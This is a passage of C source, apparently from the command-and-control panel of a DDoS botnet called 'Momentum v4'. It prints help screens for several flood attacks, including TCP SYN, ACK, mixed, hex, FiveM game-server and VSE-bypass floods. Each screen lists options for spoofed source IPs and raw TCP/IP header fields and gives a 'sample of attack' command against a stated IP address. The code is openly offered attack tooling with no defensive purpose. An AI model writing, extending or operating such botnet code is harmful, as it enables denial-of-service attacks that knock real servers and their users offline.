  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mETHERNET\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mETHERNET\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n\r\n", strlen("\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!ethernet 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!ethernet 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
            continue;
        }
        if(data == "!ackplain help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mACKPLAIN\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mACKPLAIN\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[36;1msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[36;1murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!ackplain 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!ackplain 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "!tcpconn help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mTCPCONN\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mTCPCONN\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[36;1msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[36;1murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!tcpconn 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!tcpconn 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "!tcpmix help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mTCPMIX\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mTCPMIX\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[36;1msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[36;1murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!tcpmix 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!tcpmix 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "!tcpsyn help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mTCPSYN\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mTCPSYN\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[36;1msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[36;1murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!tcpsyn 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!tcpsyn 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
            continue;
        }


        if(data == "!hex help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mHEX\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mHEX\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msport: \e[37mTCP header source port (default random).\r\n\r\n", strlen("\e[36;1msport: \e[37mTCP header source port (default random).\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!hex 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msize\e[37m=1440\r\n", strlen("\e[37m!hex 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msize\e[37m=1440\r\n"), MSG_NOSIGNAL);
            continue;
        }

         if(data == "!udpfivem help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mUDP-FIVEM\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mUDP-FIVEM\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!fivem 77.77.77.78 \e[36;1mport\e[37m=30120 \e[36;1msize\e[37m=540 (choose your own)\r\n", strlen("\e[37m!fivem 77.77.77.78 \e[36;1mport\e[37m=30120 \e[36;1msize\e[37m=540 (choose your own)\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "!vsebypass help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mVSEBYPASS\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mVSEBYPASS\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
